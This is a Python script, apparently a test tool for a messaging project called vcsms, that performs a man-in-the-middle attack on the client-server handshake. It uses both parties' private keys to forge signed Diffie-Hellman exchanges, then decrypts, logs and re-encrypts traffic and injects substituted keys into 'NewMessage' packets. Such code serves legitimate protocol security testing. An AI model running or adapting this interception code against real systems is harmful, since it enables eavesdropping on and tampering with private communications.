#!/usr/bin/env python3
import random
import socket
import threading
import argparse
import subprocess
import os
import sys

sys.path.append("..")
from vcsms.cryptography.exceptions import CryptographyException
from vcsms.improved_socket import ImprovedSocket
from vcsms.message_parser import MessageParser
from vcsms.cryptography import dhke, sha256, utils, aes256, rsa
from vcsms.client import OUTGOING_MESSAGE_TYPES
from vcsms.client import INCOMING_MESSAGE_TYPES
from vcsms import signing, keys

MODIFY_LOCK = threading.Lock()
message_types = INCOMING_MESSAGE_TYPES
message_types.update(OUTGOING_MESSAGE_TYPES)
MESSAGE_PARSER = MessageParser(message_types, message_types, {})

def forward(fsock: ImprovedSocket, tsock: ImprovedSocket):
    data = fsock.recv()
    tsock.send(data)
    return data

def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_privkey: tuple) -> tuple:
    forward(s, c)  # server sends pub key
    forward(c, s)  # client sends pub key
    m_dh_privkey = random.randrange(1, dhke.group16_4096[1]) 
    m_dh_pubkey, m_sig_c = signing.gen_signed_dh(m_dh_privkey, c_privkey, dhke.group14_2048)
    _, m_sig_s = signing.gen_signed_dh(m_dh_privkey, s_privkey, dhke.group14_2048)
    s_dh_packet = s.recv()  # server sends difhel pub
    try:
        s_dh_pubkey = int(s_dh_packet.split(b':')[0], 16)
    except ValueError:
        print("Server diffie hellman key malformed")
        return (0, 0)
    print("Server sent diffie hellman public key")
    s_secret = dhke.calculate_shared_key(m_dh_privkey, s_dh_pubkey, dhke.group14_2048) 
    s.send(hex(m_dh_pubkey)[2:].encode() + b':' + m_sig_c)  # diffie hellman key signed with client private
    c.send(hex(m_dh_pubkey)[2:].encode() + b':' + m_sig_s)  # diffie hellman key signed with server private
    c_dh_packet = c.recv()  # client sends difhel pub
    try:
        c_dh_pubkey = int(c_dh_packet.split(b':')[0], 16)
    except ValueError:
        print("Client diffie hellman key malformed")
        return (0, 0)
    print("Client sent diffie hellman public key")
    c_secret = dhke.calculate_shared_key(m_dh_privkey, c_dh_pubkey, dhke.group14_2048)
    s_key = sha256.hash(utils.i_to_b(s_secret))  # session key with server
    c_key = sha256.hash(utils.i_to_b(c_secret))  # session key with client
    challenge = s.recv()  # server sends encrypted challenge
    try:
        iv_hex, ciphertext_hex = challenge.split(b':')
        iv = int(iv_hex, 16)
        ciphertext = bytes.fromhex(ciphertext_hex.decode('utf-8'))
    except:
        print("Server sent malformed challenge")
        return (0, 0)
    print("Server sent encrypted challenge")
    try:
        answer = aes256.decrypt_cbc(ciphertext, s_key, iv)
    except CryptographyException:
        print("Failed to decrypt challenge")
        return (0, 0)
    s.send(answer.hex().encode('utf-8'))  # i reply with decrypted challenge
    c_challenge = aes256.encrypt_cbc(answer, c_key, iv)
    c.send(hex(iv)[2:].encode('utf-8') + b':' + c_challenge.hex().encode('utf-8'))  
    # i send challenge to client

    if s.recv() != b'OK':
        print("Server rejected challenge response")
        return (0, 0)
    print("Succeeded server challenge")
    c_response = c.recv()  # client responds with challenge answer
    try:
        c_answer = bytes.fromhex(c_response.decode('utf-8'))
    except:
        print("Client sent malformed challenge response")
        return (0, 0)
    if c_answer != answer:
        print("Client failed challenge")
        return (0, 0)
    c.send(b'OK')  # inform client they were correct
    print("Handshake completed successfully") 
    return (s_key, c_key)

def capture(f_sock: ImprovedSocket, t_sock: ImprovedSocket, f_enc_key: int, t_enc_key: int, direction: str):
    while f_sock.connected and t_sock.connected:
        raw = f_sock.recv()
        iv_hex, ciphertext_hex = raw.split(b':')
        iv = int(iv_hex, 16)
        ciphertext = bytes.fromhex(ciphertext_hex.decode('utf-8'))
        data = aes256.decrypt_cbc(ciphertext, f_enc_key, iv)
        client_id, message_type, parameters = MESSAGE_PARSER.parse_message(data)
        print(f'MESSAGE OF TYPE {message_type} {direction} {client_id}')
        if message_type == "NewMessage":
            message_index, dh_pub, dh_sig = parameters
            print("Generating new diffie hellman key...")
            private_dh = random.randrange(2, 2**128)
            public_dh = dhke.generate_public_key(private_dh, dhke.group14_2048)
            print("Injecting diffie hellman key...")
            modified = MESSAGE_PARSER.construct_message(client_id, "NewMessage", message_index, public_dh, dh_sig)
        else:
            modified = data
        reencrypted = aes256.encrypt_cbc(modified, t_enc_key, iv)
        t_sock.send(iv_hex + b':' + reencrypted.hex().encode('utf-8'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("server_ip", type=str, help="The IP address of the server")
    parser.add_argument("-p", "--server_port", type=int, default=6000, help="The server's listening port")
    parser.add_argument("-P", "--listen_port", type=int, default=6000, help="The port to listen for connections on")
    parser.add_argument("-l", "--interface", type=str, default="127.0.0.1", help="The IP address of the interface to listen on")
    parser.add_argument("client_private", type=str, help="The file containing the client's private key")
    parser.add_argument("server_private", type=str, help="The file containing the server's private key")
    parser.add_argument("client_password", type=str, help="The client's master password")
    parser.add_argument("server_password", type=str, help="The server's master password")
    args = parser.parse_args()
    client_enc_key = keys.derive_key(args.client_password)
    server_enc_key = keys.derive_key(args.server_password)
    client_private_key = keys.load_key(args.client_private, client_enc_key)
    server_private_key = keys.load_key(args.server_private, server_enc_key)
    server_socket_raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    server_socket_raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket = ImprovedSocket(server_socket_raw)
    accept_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    accept_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    accept_socket.bind((args.interface, args.listen_port))
    accept_socket.listen(30)
    print(f"Listening for a connection on {args.interface}:{args.listen_port}...")
    c, addr = accept_socket.accept()
    print(f"Got connection from {addr}")
    client_socket = ImprovedSocket(c)
    client_socket.run()
    server_socket.connect(args.server_ip, args.server_port)
    server_socket.run()
    server_key, client_key = mitm_handshake(client_socket, server_socket, client_private_key, server_private_key)
    s_to_c = threading.Thread(target=capture, args=(server_socket, client_socket, server_key, client_key, "from"))
    c_to_s = threading.Thread(target=capture, args=(client_socket, server_socket, client_key, server_key, "to"))
    s_to_c.start()
    c_to_s.start()
